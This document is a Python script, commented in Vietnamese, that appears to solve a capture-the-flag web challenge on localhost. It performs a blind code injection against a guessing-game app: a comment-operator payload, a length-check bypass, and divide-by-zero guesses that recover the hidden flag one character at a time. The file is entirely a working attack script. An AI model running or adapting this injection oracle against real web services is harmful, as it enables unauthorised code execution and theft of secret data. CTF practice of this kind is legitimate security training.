import requests
import string
import re

# --- CẤU HÌNH ---
BASE_URL = "http://localhost:5000"
# Tập ký tự để thử, có thể mở rộng nếu cần
# Bắt đầu với các ký tự phổ biến nhất trong cờ CTF
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_-!?"

def check_char(position, char_guess):
    """
    Kiểm tra xem ký tự ở vị trí `position` có phải là `char_guess` không.
    Trả về True nếu đoán đúng, False nếu sai.
    """
    s = requests.Session()
    
    # Payload 'actual' và 'operator' có thể là bất cứ thứ gì hợp lệ,
    # vì chúng sẽ bị vô hiệu hóa bởi payload trong 'guess'.
    # Tuy nhiên, để cú pháp hợp lệ, chúng ta cần một cái gì đó.
    # Một comment là lý tưởng nhất.
    actual = 'A  '
    operator = '#=' # Hợp lệ: dài 2, chứa '=', không alpha. Biến mọi thứ sau nó thành comment.
    
    # Payload tấn công mù. Gửi một chuỗi dài hơn 3 để bypass check `len != 3`
    # Logic: Gây lỗi (chia cho 0) nếu đoán SAI.
    guess_payload = f"1/ (ITEM[{position}]=='{char_guess}')"

    try:
        # 1. Tạo game
        res_create = s.post(f"{BASE_URL}/create", data={'actual': actual, 'operator': operator})
        game_id = re.search(r'/play/([a-f0-9]{8})', res_create.text).group(1)
        
        # 2. Chơi game với payload tấn công
        res_play = s.post(f"{BASE_URL}/play/{game_id}", data={'guess': guess_payload})
        
        # 3. Phân tích response
        # Nếu KHÔNG có lỗi -> đoán ĐÚNG -> response KHÔNG chứa dấu '-' ở đầu
        # Nếu CÓ lỗi -> đoán SAI -> response CHỨA dấu '-' ở đầu
        if "-Sorry, wrong guess." not in res_play.text:
            return True
        else:
            return False

    except (requests.exceptions.RequestException, AttributeError):
        # Lỗi mạng hoặc không tìm thấy game_id, coi như đoán sai
        return False

# --- CHẠY TẤN CÔNG ---
if __name__ == '__main__':
    flag = ""
    position = 0
    print("[+] Bắt đầu tấn công Blind Code Injection...")
    print("[+] Đang dò cờ, vui lòng đợi...")
    
    while True:
        found_char = False
        for char in CHARSET:
            print(f"\r[>] Đang thử: {flag}{char}", end="")
            
            if check_char(position, char):
                flag += char
                position += 1
                found_char = True
                print(f"\r[+] Tìm thấy: {flag}")
                break
        
        if not found_char:
            print("\n[!] Không tìm thấy thêm ký tự nào. Có thể đã hết cờ hoặc có lỗi.")
            break
        
        # Thường thì cờ kết thúc bằng '}'
        if flag.endswith('}'):
            print("\n[***] TẤN CÔNG HOÀN TẤT! [***]")
            print(f"[*] Cờ cuối cùng là: {flag}")
            break